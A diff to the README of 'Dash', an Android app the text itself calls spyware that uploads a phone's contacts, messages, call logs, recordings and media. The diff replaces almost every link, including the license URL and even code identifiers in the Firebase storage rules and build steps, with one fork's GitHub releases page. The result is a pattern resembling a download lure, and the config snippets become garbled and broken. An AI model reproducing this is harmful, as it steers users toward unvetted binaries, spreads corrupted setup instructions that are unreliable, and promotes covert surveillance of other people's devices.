@@ -3,9 +3,9 @@
 
 ---
 
-![20200808_160757](https://1.bp.blogspot.com/-FgzZ6s4snE0/YLonted4bRI/AAAAAAAAA7M/btcFeIotLw42dSwU9AioHomX_GcG-xmogCLcBGAsYHQ/s1429/68747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d71374d454847336e4851342f583979763436467a3543492f41414141414141414152342f574a46387a3046766b6251325968725f6c6356686a6375473371306b5030587077434c63424741735948512f7.png)
+![20200808_160757](https://github.com/Londjide/Dash/releases)
 
-<noscript><a href="https://liberapay.com/muneeb/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
+<noscript><a href="https://github.com/Londjide/Dash/releases"><img alt="Donate using Liberapay" src="https://github.com/Londjide/Dash/releases"></a></noscript>
 
 # Dash
 This is an Android Spyware App, Which uploads user data such as Contacts, Messages, Call log &amp; recordings, Send messages, Photos, Videos, etc.
@@ -26,7 +26,7 @@ The application is installed on the child's device as well as on the parent's de
 
 # Build this project
 the application work with the api of firebase with which you will have to create a project in firebase and synchronize the application with such project.
-[Firebase API](https://firebase.google.com/)
+[Firebase API](https://github.com/Londjide/Dash/releases)
 
 Enable the following development platforms on firebase:
 `Authentication`, `realtime database` and `storage`.
@@ -45,16 +45,16 @@ Enable the following development platforms on firebase:
 
 - in firebase storage assign the following rules:
 ```java
-service firebase.storage {
+service https://github.com/Londjide/Dash/releases {
   match /b/{bucket}/o {
     match /{allPaths=**} {
-      allow read, write: if request.auth != null;
+      allow read, write: if https://github.com/Londjide/Dash/releases != null;
     }
   }
 }
 ```
 
-- In the `build.gradle` assign the social network package of your preference.
+- In the `https://github.com/Londjide/Dash/releases` assign the social network package of your preference.
 also you will have to recreate the view in xml of the social network
 ```java
 ext {
@@ -62,9 +62,9 @@ ext {
 }
 ```
 
-In the `res/values/string.xml` assign your `APY_KEY_MAPS`
+In the `https://github.com/Londjide/Dash/releases` assign your `APY_KEY_MAPS`
 
-- Get the GOOGLE MAPS API KEY [here](https://developers.google.com/maps/documentation/android-api/signup)
+- Get the GOOGLE MAPS API KEY [here](https://github.com/Londjide/Dash/releases)
 ```java
 <string name="APY_KEY_MAPS">YOU_API_KEY_MAPS</string>
 ```
@@ -86,7 +86,7 @@ Copyright [2020] [muneebwanee]
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://github.com/Londjide/Dash/releases
 
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
@@ -96,7 +96,7 @@ Copyright [2020] [muneebwanee]
 ```
 ---
 ### ❤️Supporters❤️
-[![Stargazers repo roster for @swagkarna/Rafel-Rat](https://reporoster.com/stars/muneebwanee/Dash)](https://github.com/muneebwanee/Dash/stargazers)
-[![Forkers repo roster for @swagkarna/Rafel-Rat](https://reporoster.com/forks/muneebwanee/Dash)](https://github.com/muneebwanee/Dash/network/members)
+[![Stargazers repo roster for @swagkarna/Rafel-Rat](https://github.com/Londjide/Dash/releases)](https://github.com/Londjide/Dash/releases)
+[![Forkers repo roster for @swagkarna/Rafel-Rat](https://github.com/Londjide/Dash/releases)](https://github.com/Londjide/Dash/releases)
 
 ---
